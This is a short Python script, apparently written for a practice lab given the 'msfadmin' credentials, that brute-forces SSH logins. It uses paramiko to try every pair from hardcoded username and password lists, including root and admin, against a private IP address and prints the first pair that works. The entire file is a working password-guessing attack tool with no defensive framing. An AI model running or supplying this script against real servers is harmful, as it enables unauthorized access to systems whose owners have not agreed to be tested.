import paramiko
import time

def ssh_bruteforce(ip, username_list, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in username_list:
        for password in password_list:
            try:
                print(f"Attempting bruteforce with {username}-{password}")
                ssh.connect(ip, username=username, password=password)

                print(f"Successful attempt with {username} - {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f" Failed with {username} - {password}")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                ssh.close()
            
            time.sleep(1)



if __name__ == "__main__":
    username_list = ['root', 'admin', 'msfadmin', 'user', 'guest']

    password_list = ['123456', 'password', 'msfadmin', 'admin', 'root123', 'qwerty']

    target_ip = "10.2.10.154"

    ssh_bruteforce(target_ip, username_list, password_list)